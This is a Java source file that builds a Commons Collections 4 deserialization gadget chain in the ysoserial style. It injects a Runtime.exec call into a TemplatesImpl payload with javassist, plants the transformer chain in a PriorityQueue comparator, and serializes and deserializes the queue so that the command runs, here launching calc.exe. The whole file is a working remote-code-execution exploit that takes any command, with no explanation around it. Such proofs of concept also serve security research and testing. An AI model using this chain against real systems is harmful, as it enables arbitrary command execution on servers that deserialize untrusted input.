import com.nqzero.permit.Permit;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.AccessibleObject;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class cc4_2 {
    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }

    public static Object unserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    }


    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = null;
        Class clazz = obj.getClass();
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = clazz.getSuperclass().getDeclaredField(fieldName);
        }
        field.set(obj, value);
    }
    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}
        @Override
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }
    public static Object createTemplatesImpl(String command) throws Exception{
        Object templates = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl").newInstance();
        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
            "\");";
        ((CtClass) clazz).makeClassInitializer().insertAfter(cmd);
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        final byte[] classBytes = clazz.toBytecode();
        setFieldValue(templates, "_bytecodes", new byte[][] {
            classBytes});
        // required to make TemplatesImpl happy
        setFieldValue(templates, "_name", "Pwnr");
        setFieldValue(templates, "_tfactory", Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());
        return templates;
    }

    public static void main(String[]  args) throws Exception {
        final Object templates = createTemplatesImpl("calc.exe");
        // mock method name until armed
        ConstantTransformer constant = new ConstantTransformer( TrAXFilter.class);
        Class[] paramTypes = new Class[] { Templates.class };
        Object[] argsv = new Object[] { templates };
        InstantiateTransformer instantiate = new InstantiateTransformer(
            paramTypes, argsv);
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2);
        queue.add(1);
        queue.add(1);
        TransformingComparator transCom = new TransformingComparator(chain);
        Field com = PriorityQueue.class.getDeclaredField("comparator");
        com.setAccessible(true);
        com.set(queue,transCom);

        byte[] serializeData=serialize(queue);
        unserialize(serializeData);
    }
}
